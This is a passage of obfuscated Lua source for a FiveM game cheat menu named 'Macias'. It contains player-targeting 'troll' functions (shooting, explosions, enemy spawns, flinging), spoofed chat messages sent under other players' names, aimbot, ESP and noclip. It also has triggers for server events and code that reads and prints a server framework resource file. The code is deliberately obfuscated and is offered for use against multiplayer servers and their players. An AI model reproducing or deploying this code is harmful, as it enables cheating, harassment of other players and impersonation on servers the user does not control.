                            Macias.PushNotification("Resource was not found!", 5000)
                        end
                    end
                elseif Macias.Button("Spawn Owned Vehicle", "ESX | Server") then
                    local TeYU1UTxP2vuVlGJQCgXu = KeyboardInputMacias("Enter Vehicle Spawn Name", " ", 10)
                    local WftkI_gJ69V = KeyboardInputMacias("Enter Vehicle Plate Number", " ", 8)
                    MaciasFunc.sPO.SpawnLegalVehicle(TeYU1UTxP2vuVlGJQCgXu, selectedPlayer, WftkI_gJ69V)
                elseif Macias.Button("Send Fake Message", "Server") then
                    local K5blC2fHvw2Lp = KeyboardInputMacias("Enter message to send", " ", 100.0)
                    if K5blC2fHvw2Lp ~= " " then
                        TriggerMaciasEvent(
                            true,
                            "_chat:messageEntered",
                            GetPlayerName(selectedPlayer),
                            {YKyAw.r, YKyAw.g, YKyAw.b},
                            K5blC2fHvw2Lp
                        )
                    end
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("selectedPlayerOptionsTroll") then
                if Macias.Button("Clear Animation/Tasks", "Native") then
                    ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
                elseif
                    Macias.ComboBox(
                        "Shoot Player",
                        {"Taze", "Pistol", "AK"},
                        Ksu5eXfU1y,
                        O4_m_VE52xXU0mUp_g590,
                        function(ZIPPeBfkP0hrS, AdZyNy_tA26)
                            Ksu5eXfU1y = ZIPPeBfkP0hrS
                            O4_m_VE52xXU0mUp_g590 = ZIPPeBfkP0hrS
                        end
                    )
                 then
                    if O4_m_VE52xXU0mUp_g590 == 1 then
                        MaciasFunc.sPO.shootAt(GetPlayerPed(selectedPlayer), "WEAPON_STUNGUN")
                    elseif O4_m_VE52xXU0mUp_g590 == 2 then
                        MaciasFunc.sPO.shootAt(GetPlayerPed(selectedPlayer), "WEAPON_PISTOL")
                    elseif O4_m_VE52xXU0mUp_g590 == 3 then
                        MaciasFunc.sPO.shootAt(GetPlayerPed(selectedPlayer), "WEAPON_ASSAULTRIFLE")
                    end
                elseif Macias.Button("Rape Vehicle", "Native") then
                    local LY3G3dD3tA59 = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), false)
                    ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
                    MaciasFunc.sPO.rapeVehicle(LY3G3dD3tA59)
                elseif Macias.Button("Spawn Weapon Pickups", "Native") then
                    MaciasFunc.sPO.spawnPickupsOn(GetPlayerPed(selectedPlayer))
                elseif Macias.Button("Spawn Enemies", "Native") then
                    MaciasFunc.sPO.spawnEnemies(GetPlayerPed(selectedPlayer), "a_m_y_skater_01")
                elseif Macias.Button("Spawn Heli Enemies", "Native") then
                    MaciasFunc.sPO.spawnHeliEnemies(GetPlayerPed(selectedPlayer))
                elseif Macias.Button("Spawn Tank Enemy", "Native") then
                    MaciasFunc.sPO.spawnTankEnemy(GetPlayerPed(selectedPlayer))
                elseif Macias.Button("Explode ~r~(!)", "Native") then
                    local qzvkQ = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    AddExplosion(qzvkQ.x + 1, qzvkQ.y + 1, qzvkQ.z + 1, 4, 100.0, true, false, 0)
                elseif
                    Macias.ComboBox(
                        "Spawn Props",
                        {
                            "Gas Pump",
                            "Beach Fire",
                            "Gas Tank",
                            "UFO",
                            "Dildo",
                            "Toilet",
                            "Missile",
                            "Couch",
                            "Banana Party",
                            "Ramp"
                        },
                        Wi1DeMQa,
                        f9uvgbrB,
                        function(VbrH51bwdDIQZ0AhYZ9xD, P)
                            Wi1DeMQa = VbrH51bwdDIQZ0AhYZ9xD
                            f9uvgbrB = VbrH51bwdDIQZ0AhYZ9xD
                        end
                    )
                 then
                    if f9uvgbrB == 1 then
                        MaciasFunc.sPO.gasPump(GetPlayerPed(selectedPlayer))
                    elseif f9uvgbrB == 2 then
                        MaciasFunc.sPO.beachFire(GetPlayerPed(selectedPlayer))
                    elseif f9uvgbrB == 3 then
                        MaciasFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), "prop_gas_tank_01a")
                        MaciasFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), "prop_gascyl_01a")
                    elseif f9uvgbrB == 4 then
                        MaciasFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), "p_spinning_anus_s")
                    elseif f9uvgbrB == 5 then
                        MaciasFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), "prop_cs_dildo_01")
                    elseif f9uvgbrB == 6 then
                        MaciasFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), "prop_ld_toilet_01")
                    elseif f9uvgbrB == 7 then
                        MaciasFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), "prop_ld_bomb_anim")
                    elseif f9uvgbrB == 8 then
                        MaciasFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), "prop_ld_farm_couch01")
                    elseif f9uvgbrB == 9 then
                        MaciasFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), "p_crahsed_heli_s")
                        MaciasFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), "prop_rock_4_big2")
                        MaciasFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), "prop_beachflag_le")
                    elseif f9uvgbrB == 10 then
                        MaciasFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), "stt_prop_stunt_track_uturn")
                        MaciasFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), "stt_prop_stunt_track_turnice")
                        MaciasFunc.sPO.spawnTrollProp(GetPlayerPed(selectedPlayer), "stt_prop_stunt_track_hill")
                    end
                elseif
                    Macias.ComboBox(
                        "Ram Vehicle",
                        o,
                        NOY,
                        nKGJjT,
                        function(R74FFqBxavfyn, yrmfT_)
                            NOY = R74FFqBxavfyn
                            nKGJjT = R74FFqBxavfyn
                            PYFWQhTGNGfHR_keh8xib = o[R74FFqBxavfyn]
                        end
                    )
                 then
                    MaciasFunc.sPO.ramVehicle(GetPlayerPed(selectedPlayer), PYFWQhTGNGfHR_keh8xib)
                elseif
                    Macias.Button(
                        "Fling Player ~r~(!)",
                        Oz and "Flinging: [" .. GetPlayerServerId(SjqKFFPQMn0FcwBwiS4mE) .. "]" or "Flinging: [-1]"
                    )
                 then
                    Oz = not Oz
                    SjqKFFPQMn0FcwBwiS4mE = selectedPlayer
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("visualOptions") then
                if
                    Macias.MenuButton(
                        "Extra Sensory Perception",
                        "visualOptionsESP",
                        " ",
                        {dict = "mphud", text = "spectating", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Macias.ComboBox(
                        "Crosshair",
                        customCrosshairOptsMacias,
                        currentCustomCrosshair,
                        selectedCustomCrosshair,
                        function(r4, osY072Q)
                            currentCustomCrosshair = r4
                            selectedCustomCrosshair = r4
                        end
                    )
                 then
                elseif Macias.CheckBox("Force Player Blips", z_nQ) then
                    MaciasFunc.playerBlips()
                elseif Macias.CheckBox("Force Radar", WfYVJ8MoOy3Hl7) then
                    WfYVJ8MoOy3Hl7 = not WfYVJ8MoOy3Hl7
                elseif Macias.CheckBox("Force Gamertags", nkZB) then
                    nkZB = not nkZB
                elseif Macias.CheckBox("Blackout", H) then
                    H = not H
                elseif Macias.Button("Optimize FPS", "Native") then
                    MaciasFunc.optimizeFPS()
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("visualOptionsESP") then
                if Macias.CheckBox("Enable", iFJo9N75fE6X) then
                    iFJo9N75fE6X = not iFJo9N75fE6X
                    MaciasFunc.toggleESP()
                elseif Macias.CheckBox("ID", cCCjZqd78) then
                    cCCjZqd78 = not cCCjZqd78
                elseif Macias.CheckBox("Name", A__TqtbeQPVTbDeT) then
                    A__TqtbeQPVTbDeT = not A__TqtbeQPVTbDeT
                elseif Macias.CheckBox("Distance", FUxbInvVV02Fi) then
                    FUxbInvVV02Fi = not FUxbInvVV02Fi
                elseif Macias.CheckBox("Weapon", ECclILYClVywd2ROgA0J) then
                    ECclILYClVywd2ROgA0J = not ECclILYClVywd2ROgA0J
                elseif Macias.CheckBox("Vehicle", xaEYqsfYZ) then
                    xaEYqsfYZ = not xaEYqsfYZ
                elseif
                    Macias.ComboBoxSlider(
                        "ESP Refresh Rate",
                        visualsESPRefreshRates,
                        ar88eiT8j,
                        k3Rlj4_Lrt5rcEJF,
                        function(MjPu2aT6HYlVhN1DVu, Pv7Q9G)
                            ar88eiT8j = MjPu2aT6HYlVhN1DVu
                            k3Rlj4_Lrt5rcEJF = MjPu2aT6HYlVhN1DVu
                            if MjPu2aT6HYlVhN1DVu == 1 then
                                gCMfMaXEV = 0
                            elseif MjPu2aT6HYlVhN1DVu == 2 then
                                gCMfMaXEV = 50
                            elseif MjPu2aT6HYlVhN1DVu == 3 then
                                gCMfMaXEV = 150
                            elseif MjPu2aT6HYlVhN1DVu == 4 then
                                gCMfMaXEV = 250.0
                            elseif MjPu2aT6HYlVhN1DVu == 5 then
                                gCMfMaXEV = 500
                            elseif MjPu2aT6HYlVhN1DVu == 6 then
                                gCMfMaXEV = 1000.0
                            elseif MjPu2aT6HYlVhN1DVu == 7 then
                                gCMfMaXEV = 2000.0
                            elseif MjPu2aT6HYlVhN1DVu == 8 then
                                gCMfMaXEV = 5000
                            end
                        end
                    )
                 then
                elseif
                    Macias.ComboBoxSlider(
                        "ESP Distance",
                        EuamD,
                        qGv5kiGp9cZEP5mq,
                        FyZ0zUmPGl,
                        function(NfHM_O6xqqpFISFEk6, APZ)
                            qGv5kiGp9cZEP5mq = NfHM_O6xqqpFISFEk6
                            FyZ0zUmPGl = NfHM_O6xqqpFISFEk6
                            visualsESPDistance = EuamD[qGv5kiGp9cZEP5mq]
                        end
                    )
                 then
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("teleportOptions") then
                if Macias.Button("Teleport To Waypoint", "Native") then
                    MaciasFunc.teleportToWaypoint()
                elseif
                    Macias.ComboBox(
                        "Teleport To",
                        {"Legion Square", "Weed Farm", "Meth Farm", "Coke Farm", "Money Wash", "Mission Row PD"},
                        QTn0uZ,
                        Ls,
                        function(q7Q68mQ_, fVib)
                            QTn0uZ = q7Q68mQ_
                            Ls = q7Q68mQ_
                        end
                    )
                 then
                    if Ls == 1 then
                        SetEntityCoords(PlayerPedId(), 195.23, -934.04, 30.69)
                    elseif Ls == 2 then
                        SetEntityCoords(PlayerPedId(), 1066.009, -3183.386, -39.164)
                    elseif Ls == 3 then
                        SetEntityCoords(PlayerPedId(), 998.629, -3199.545, -36.394)
                    elseif Ls == 4 then
                        SetEntityCoords(PlayerPedId(), 1088.636, -3188.551, -38.993)
                    elseif Ls == 5 then
                        SetEntityCoords(PlayerPedId(), 1118.405, -3193.687, -40.394)
                    elseif Ls == 6 then
                        SetEntityCoords(PlayerPedId(), 441.56, -982.9, 30.69)
                    end
                elseif Macias.Button("Teleport To Coords", "Native") then
                    local dTHJfwnTI = KeyboardInputMacias("X Coord", " ", 5)
                    local TUXp2D1KV5nKk = KeyboardInputMacias("Y Coord", " ", 5)
                    local Y8N5kyPcRIaA = KeyboardInputMacias("Z Coord", " ", 3)
                    if dTHJfwnTI ~= " " or TUXp2D1KV5nKk ~= " " then
                        if Y8N5kyPcRIaA ~= " " then
                            Y8N5kyPcRIaA = 30
                        end
                        if
                            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
                         then
                            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                        else
                            entity = GetPlayerPed(-1)
                        end
                        if entity then
                            SetEntityCoords(
                                entity,
                                tonumber(dTHJfwnTI),
                                tonumber(TUXp2D1KV5nKk),
                                tonumber(Y8N5kyPcRIaA)
                            )
                        end
                    end
                elseif Macias.CheckBox("Show Coords", NF3U) then
                    NF3U = not NF3U
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("vehicleOptions") then
                if Macias.MenuButton("Los Santos Customs", "vehicleLosSantosCustoms") then
                elseif Macias.MenuButton("Vehicle Spawn List", "vehicleSpawnList") then
                elseif Macias.CheckBox("Godmode", C8RfqDn) then
                    C8RfqDn = not C8RfqDn
                elseif Macias.Button("Repair Vehicle", "Native") then
                    MaciasFunc.repairVehicle(GetVehiclePedIsIn(PlayerPedId(), 0))
                elseif Macias.Button("Clean Vehicle", "Native") then
                    SetVehicleDirtLevel(GetVehiclePedIsIn(PlayerPedId(), 0), 0)
                elseif Macias.Button("Dirty Vehicle", "Native") then
                    SetVehicleDirtLevel(GetVehiclePedIsIn(PlayerPedId(), 0), 15)
                elseif Macias.Button("Flip Vehicle", "Native") then
                    SetVehicleOnGroundProperly(GetVehiclePedIsIn(PlayerPedId(), 0))
                elseif Macias.Button("Delete Vehicle", "Native") then
                    MaciasFunc.deleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 0))
                elseif Macias.Button("Delete Vehicles Within Radius", "Native") then
                    MaciasFunc.deleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 0), 100.0)
                elseif
                    Macias.ComboBoxSlider(
                        "Engine Power Boost",
                        y7uMZQ2Z3TAVfx0,
                        IwAG2CcXg,
                        e,
                        function(al0xTZirT1pVeyjSNtH, fxRmO)
                            IwAG2CcXg = al0xTZirT1pVeyjSNtH
                            e = al0xTZirT1pVeyjSNtH
                            tWPGzJDB = V1OlsNoxFONjl[al0xTZirT1pVeyjSNtH]
                        end
                    )
                 then
                elseif
                    Macias.ComboBoxSlider(
                        "Engine Torque Boost",
                        y7uMZQ2Z3TAVfx0,
                        Mx5nRgSY5324XtZzQB,
                        s7sZw5_atn,
                        function(f, HXxruzteOyXJCwBd)
                            Mx5nRgSY5324XtZzQB = f
                            s7sZw5_atn = f
                            AGJfaPksVU = V1OlsNoxFONjl[f]
                        end
                    )
                 then
                elseif
                    Macias.ComboBox(
                        "Change sound",
                        IkkxK1nE,
                        SoNdW_byQzxEG,
                        p,
                        function(yfhEMY, Z6pXzPtzwQkQNkzUYR9tL)
                            SoNdW_byQzxEG = yfhEMY
                            p = Z6pXzPtzwQkQNkzUYR9tL
                        end
                    )
                 then
                    ForceVehicleEngineAudio(GetVehiclePedIsIn(GetPlayerPed(-1), false), IkkxK1nE[p])
                elseif Macias.CheckBox("No Fall", pr_jxNqpjnLEezH) then
                    pr_jxNqpjnLEezH = not pr_jxNqpjnLEezH
                elseif Macias.CheckBox("Rainbow Paintjob", fmT) then
                    fmT = not fmT
                elseif Macias.CheckBox("Rainbow Lights", rwIrTL9JmO7v) then
                    rwIrTL9JmO7v = not rwIrTL9JmO7v
                elseif Macias.CheckBox("Lower Vehicle", KzFsC7pbI) then
                    KzFsC7pbI = not KzFsC7pbI
                elseif Macias.CheckBox("Wallride", cZ8CKxjM_N1) then
                    cZ8CKxjM_N1 = not cZ8CKxjM_N1
                elseif Macias.CheckBox("2-Step Vehicle", InqLDivpr6) then
                    InqLDivpr6 = not InqLDivpr6
                elseif Macias.CheckBox("Always Wheelie", LAIOcfn3rolnOx1W) then
                    LAIOcfn3rolnOx1W = not LAIOcfn3rolnOx1W
                elseif Macias.CheckBox("Drift Smoke", ai) then
                    ai = not ai
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("weaponOptions") then
                if Macias.MenuButton("Give Single Weapon", "weaponOptionsTypes") then
                elseif Macias.Button("Give All Weapons", "Native") then
                    MaciasFunc.sPO.giveAllWeapons(GetPlayerPed(-1))
                elseif Macias.Button("Remove All Weapons", "Native") then
                    RemoveAllPedWeapons(PlayerPedId(-1), true)
                elseif
                    Macias.ComboBox(
                        "Damage Multiplier",
                        OqRdAq1j,
                        a,
                        EHs,
                        function(PPT6fiV, KC)
                            a = PPT6fiV
                            EHs = PPT6fiV
                            zMMHskuAX7QW9noU = OqRdAq1j[EHs]
                        end
                    )
                 then
                elseif Macias.CheckBox("Explosive Impact", MIPSqLh9aOgDF2JHx) then
                    MIPSqLh9aOgDF2JHx = not MIPSqLh9aOgDF2JHx
                elseif Macias.CheckBox("Teleport To Impact", jbGHvAqpy) then
                    jbGHvAqpy = not jbGHvAqpy
                elseif Macias.CheckBox("Rapid Fire", cAMZ5H60uTxQqSP) then
                    cAMZ5H60uTxQqSP = not cAMZ5H60uTxQqSP
                elseif Macias.CheckBox("Aimbot ~r~(!)", QwnbTipwbcG) then
                    QwnbTipwbcG = not QwnbTipwbcG
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("serverOptions") then
                Macias.SetSubTitle("serverOptions", "Server IP: " .. GetCurrentServerEndpoint())
                if Macias.MenuButton("Server Resources", "serverOptionsResources") then
                elseif Macias.MenuButton("Trigger Events", "serverOptionsTriggerEvents") then
                elseif
                    Macias.ComboBoxSlider(
                        "Ped Density",
                        pedDensityXWords,
                        pedDensityXCurrent,
                        pedDensityXSelectedf,
                        function(BwVv1pCNLCvscV6, NWmUxre9ZJAzX)
                            pedDensityXCurrent = BwVv1pCNLCvscV6
                            pedDensityXSelectedf = BwVv1pCNLCvscV6
                            pedDensityXSelected = pedDensityX[BwVv1pCNLCvscV6]
                        end
                    )
                 then
                end
                if MaciasFunc.doesResourceExist("es_extended") then
                    if Macias.Button("Print getSharedObject", "Client") then
                        local Tir = LoadResourceFile("es_extended", "client/common.lua")
                        if Tir then
                            Tir = Tir:gsub("AddEventHandler", " ")
                            Tir = Tir:gsub("cb", " ")
                            Tir = Tir:gsub("function ", " ")
                            Tir = Tir:gsub("return ESX", " ")
                            Tir = Tir:gsub("(ESX)", " ")
                            Tir = Tir:gsub("function", " ")
                            Tir = Tir:gsub("getSharedObject%(%)", " ")
                            Tir = Tir:gsub("end", " ")
                            Tir = Tir:gsub("%(", " ")
                            Tir = Tir:gsub("%)", " ")
                            Tir = Tir:gsub(",", " ")
                            Tir = Tir:gsub("", " ")
                            Tir = Tir:gsub("'", " ")
                            Tir = Tir:gsub("%s+", " ")
                            print(tostring(Tir))
                        end
                    end
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("menuSettings") then
                if Macias.MenuButton("Credits", "credits") then
                elseif Macias.MenuButton("Keybinds", "keybindSettings") then
                elseif
                    Macias.ComboBox(
                        "Menu X",
                        xMOzIZanu,
                        BJHuenN1n,
                        tPw5Wa0sc7K4bhxBGTWGr,
                        function(jO, ppfCd)
                            BJHuenN1n = jO
                            tPw5Wa0sc7K4bhxBGTWGr = ppfCd
                            for i = 1, #menus_listMaciasMacias do
                                Macias.SetMenuX(menus_listMaciasMacias[i], xMOzIZanu[BJHuenN1n])
                            end
                        end
                    )
                 then
                elseif
                    Macias.ComboBox(
                        "Menu Y",
                        JwvTSpXmUOVy_t,
                        MNfWF9cuVmEKF38C05,
                        ZhRmqkaE4,
                        function(Q2kijLQ1G9gxG7Szbsgu8, Gy5i5DWEL3Q)
                            MNfWF9cuVmEKF38C05 = Q2kijLQ1G9gxG7Szbsgu8
                            ZhRmqkaE4 = Gy5i5DWEL3Q
                            for i = 1, #menus_listMaciasMacias do
                                Macias.SetMenuY(menus_listMaciasMacias[i], JwvTSpXmUOVy_t[MNfWF9cuVmEKF38C05])
                            end
                        end
                    )
                 then
                elseif
                    Macias.ComboBox(
                        "Maximum Displayed Options",
                        fI9wfgRBZtM,
                        F1iz,
                        _PAI7biS3pxqN,
                        function(g0fT, qw5)
                            F1iz = g0fT
                            _PAI7biS3pxqN = qw5
                            for i = 1, #menus_listMaciasMacias do
                                Macias.SetMaxOptionCount(menus_listMaciasMacias[i], fI9wfgRBZtM[F1iz])
                            end
                        end
                    )
                 then
                elseif
                    Macias.ComboBox(
                        "Theme",
                        zjRtiTdduVltJH,
                        currentThemeIndex,
                        selectedThemeIndex,
                        function(EoQUCymxnK1, styftT35q4eCx)
                            currentThemeIndex = EoQUCymxnK1
                            selectedThemeIndex = EoQUCymxnK1
                        end
                    )
                 then
                    KxRMNSn0q7_cSUfk5FWwU = zjRtiTdduVltJH[selectedThemeIndex]
                    Macias.InitializeTheme()
                elseif Macias.CheckBox("Rainbow", selectedThemeRainbow) then
                    selectedThemeRainbow = not selectedThemeRainbow
                elseif Macias.CheckBox("Text Outline", PMCF7AZl_TrF1lqi) then
                    PMCF7AZl_TrF1lqi = not PMCF7AZl_TrF1lqi
                elseif Macias.CheckBox("Text Drop Shadow", tfUirGWXEhIQebFmiE) then
                    tfUirGWXEhIQebFmiE = not tfUirGWXEhIQebFmiE
                elseif Macias.CheckBox("Selection Rect", KhtMvtk783N9rO) then
                    KhtMvtk783N9rO = not KhtMvtk783N9rO
                elseif Macias.Button("~r~Close Menu") then
                    Macias.CloseMenu()
                    NywuctsA4BD4b3_G0 = false
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("credits") then
                local qP8cdrhVCn = {
                    "Patri~s~k Ne~s~r~s~tige~s~l | N~s~ert~s~ige~s~l#5~s~39~s~1, github.com/nertigel",
                    "Flacko | sir Flacko#1234, github.com/flacko1337",
                    "WarMenu | github.com/warxander/warmenu",
                    "SkidMenu | github.com/Joeyarrabi/skidmenu",
                    "RipTide | unknowncheats.me",
                    "LUX | leuit#0100, inspiration and help with sprites",
                    "swagmaster, da king"
                }
                for i = 1, #qP8cdrhVCn do
                    if Macias.Button(qP8cdrhVCn[i]) then
                    end
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("keybindSettings") then
                if Macias.Button("Menu", "[" .. OlGuUvqPdqVORQAfiabSX .. "]") then
                    print(json.encode(keyboard_keys))
                    local _L4 = string.upper(KeyboardInputMacias("Input New Key Name", " ", 10))
                    if keyboard_keys[_L4] then
                        OlGuUvqPdqVORQAfiabSX = _L4
                        Macias.PushNotification("Menu bind has been set to ~g~" .. _L4, 5000)
                    else
                        Macias.PushNotification("Key " .. _L4 .. " is not valid!", 5000)
                    end
                elseif Macias.Button("Health", "[" .. qoWbq6ZkwwgrWkguuODDo .. "]") then
                    print(json.encode(keyboard_keys))
                    local op1Ho_QWAQZkQT6h = string.upper(KeyboardInputMacias("Input New Key Name", " ", 10))
                    if keyboard_keys[op1Ho_QWAQZkQT6h] then
                        qoWbq6ZkwwgrWkguuODDo = op1Ho_QWAQZkQT6h
                        Macias.PushNotification("Menu bind has been set to ~g~" .. op1Ho_QWAQZkQT6h, 5000)
                    else
                        Macias.PushNotification("Key " .. op1Ho_QWAQZkQT6h .. " is not valid!", 5000)
                    end
                elseif Macias.Button("Armour", "[" .. qsnyzNENQPII7EPs .. "]") then
                    print(json.encode(keyboard_keys))
                    local spctkDu8wWkT_SU = string.upper(KeyboardInputMacias("Input New Key Name", " ", 10))
                    if keyboard_keys[spctkDu8wWkT_SU] then
                        qsnyzNENQPII7EPs = spctkDu8wWkT_SU
                        Macias.PushNotification("Menu bind has been set to ~g~" .. spctkDu8wWkT_SU, 5000)
                    else
                        Macias.PushNotification("Key " .. spctkDu8wWkT_SU .. " is not valid!", 5000)
                    end
                elseif Macias.Button("Magneto", "[" .. NXStf .. "]") then
                    print(json.encode(keyboard_keys))
                    local NcAE4Q3eKJ = string.upper(KeyboardInputMacias("Input New Key Name", " ", 10))
                    if keyboard_keys[NcAE4Q3eKJ] then
                        NXStf = NcAE4Q3eKJ
                        Macias.PushNotification("Menu bind has been set to ~g~" .. NcAE4Q3eKJ, 5000)
                    else
                        Macias.PushNotification("Key " .. NcAE4Q3eKJ .. " is not valid!", 5000)
                    end
                elseif Macias.Button("Noclip", "[" .. g5M .. "]") then
                    print(json.encode(keyboard_keys))
                    local G7J6TlwdGOT3Vqj9GXDjJ = string.upper(KeyboardInputMacias("Input New Key Name", " ", 10))
                    if keyboard_keys[G7J6TlwdGOT3Vqj9GXDjJ] then
                        g5M = G7J6TlwdGOT3Vqj9GXDjJ
                        Macias.PushNotification("Menu bind has been set to ~g~" .. G7J6TlwdGOT3Vqj9GXDjJ, 5000)
                    else
                        Macias.PushNotification("Key " .. G7J6TlwdGOT3Vqj9GXDjJ .. " is not valid!", 5000)
                    end
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("weaponOptionsTypes") then
                for PTDJKt2IjGvuAZud, M16e2BIB3hmRRnU8uuh in pairs(K8qdNYILVbDvC89LzVFXFGH) do
                    if Macias.MenuButton(PTDJKt2IjGvuAZud, "weaponOptionsTypeSelection") then
                        fMY3bFUiVzL = M16e2BIB3hmRRnU8uuh
                    end
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("weaponOptionsTypeSelection") then
                for nTaFAoMT_AOqNiv, GyF5jyqzrGxQ_1sajn7h_M in pairs(fMY3bFUiVzL) do
                    if Macias.MenuButton(GyF5jyqzrGxQ_1sajn7h_M.name, "weaponModOptionsOptions") then
                        qwxBa75Z2xuL = GyF5jyqzrGxQ_1sajn7h_M
                    end
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("weaponModOptionsOptions") then
                if Macias.Button("Spawn Weapon") then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(qwxBa75Z2xuL.id), 200.0, false)
                elseif Macias.Button("Add Ammo") then
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey(qwxBa75Z2xuL.id), 250.0)
                elseif Macias.CheckBox("Infinite Ammo", qwxBa75Z2xuL.bInfAmmo) then
                    qwxBa75Z2xuL.bInfAmmo = not qwxBa75Z2xuL.bInfAmmo
                    SetPedInfiniteAmmo(GetPlayerPed(-1), qwxBa75Z2xuL.bInfAmmo, GetHashKey(qwxBa75Z2xuL.id))
                    SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
                    PedSkipNextReloading(GetPlayerPed(-1))
                end
                for c1vEOdl6ZwUWhmztKtDC5, PaJa2xOBwTdOYO8QeMTQL in pairs(qwxBa75Z2xuL.mods) do
                    if Macias.MenuButton(c1vEOdl6ZwUWhmztKtDC5, "weaponsModSelect") then
                        GFlGQ8Y3HDh1Mug2LxZ1 = PaJa2xOBwTdOYO8QeMTQL
                    end
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("weaponsModSelect") then
                for jAW8_mXYi7, YNw9iTJkkAMFoho in pairs(GFlGQ8Y3HDh1Mug2LxZ1) do
                    if Macias.Button(YNw9iTJkkAMFoho.name) then
                        GiveWeaponComponentToPed(
                            GetPlayerPed(-1),
                            GetHashKey(qwxBa75Z2xuL.id),
                            GetHashKey(YNw9iTJkkAMFoho.id)
                        )
                    end
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("vehicleLosSantosCustoms") then
                if Macias.MenuButton("Cosmetic Upgrades", "vehicleLosSantosCustomsCosmetics") then
                elseif Macias.MenuButton("Performance Upgrades", "vehicleLosSantosCustomsPerformance") then
                elseif Macias.Button("Change License Plate", "Native") then
                    local oIL8 = KeyboardInputMacias("Enter Plate Text (8 Characters):", "d0pamine", 8)
                    if oIL8 ~= " " then
                        RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
                        SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId(), 0), oIL8)
                    end
                elseif Macias.Button("Max Peformance Upgrades", "Native") then
                    MaciasFunc.maxPerformanceUpgrades(GetVehiclePedIsIn(PlayerPedId()))
                elseif Macias.Button("Max All Upgrades", "Native") then
                    MaciasFunc.maxUpgrades(GetVehiclePedIsIn(PlayerPedId()))
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("vehicleLosSantosCustomsCosmetics") then
                if IsPedInAnyVehicle(PlayerPedId(), 0) then
                else
                    if Macias.Button("You're not inside a vehicle") then
                    end
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("vehicleLosSantosCustomsPerformance") then
                if IsPedInAnyVehicle(PlayerPedId(), 0) then
                    if IsToggleModOn(GetVehiclePedIsUsing(PlayerPedId()), 18) then
                        turboStatus = "~g~Installed"
                    else
                        turboStatus = "~r~Not Installed"
                    end
                    if Macias.Button("Turbo", turboStatus) then
                        if not IsToggleModOn(GetVehiclePedIsUsing(PlayerPedId()), 18) then
                            ToggleVehicleMod(
                                GetVehiclePedIsUsing(PlayerPedId()),
                                18,
                                not IsToggleModOn(GetVehiclePedIsUsing(PlayerPedId()), 18)
                            )
                        else
                            ToggleVehicleMod(
                                GetVehiclePedIsUsing(PlayerPedId()),
                                18,
                                not IsToggleModOn(GetVehiclePedIsUsing(PlayerPedId()), 18)
                            )
                        end
                    end
                else
                    if Macias.Button("You're not inside a vehicle") then
                    end
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("vehicleSpawnList") then
                if Macias.CheckBox("Spawn Upgraded", jU7z1fNT_Pbj85qJpm) then
                    jU7z1fNT_Pbj85qJpm = not jU7z1fNT_Pbj85qJpm
                elseif Macias.CheckBox("Spawn Inside", G8zTCymQ1Rx1) then
                    G8zTCymQ1Rx1 = not G8zTCymQ1Rx1
                elseif Macias.Button("Spawn Custom Vehicle", "Native") then
                    local H_WU3HlZYvf7ph5Xc = KeyboardInputMacias("Enter Vehicle Spawn Name", " ", 100.0)
                    if H_WU3HlZYvf7ph5Xc and IsModelValid(H_WU3HlZYvf7ph5Xc) and IsModelAVehicle(H_WU3HlZYvf7ph5Xc) then
                        MaciasFunc.spawnCustomVehicle(H_WU3HlZYvf7ph5Xc)
                    else
                        Macias.PushNotification("Model is not valid!", 5000)
                    end
                elseif Macias.Button("Spawn & Ride Train", "Native") then
                    MaciasFunc.spawnRandomTrain()
                end
                for d0A, dObpkKl9DxmXkaZLkqdo in ipairs(lSNarmGJK) do
                    if Macias.MenuButton(dObpkKl9DxmXkaZLkqdo, "vehicleSpawnSelected") then
                        selectedCarTypeIdx = d0A
                    end
                end
                Macias.Display()
            elseif Macias.IsMenuOpened("vehicleSpawnSelected") then
                for Rf4TU, XNLbJxb0j_JTk in ipairs(hm5xuURWI8CQXvc5eGxI[selectedCarTypeIdx]) do
                    local jc = GetLabelText(XNLbJxb0j_JTk)
                    if jc == "NULL" then
                        jc = XNLbJxb0j_JTk
                    end
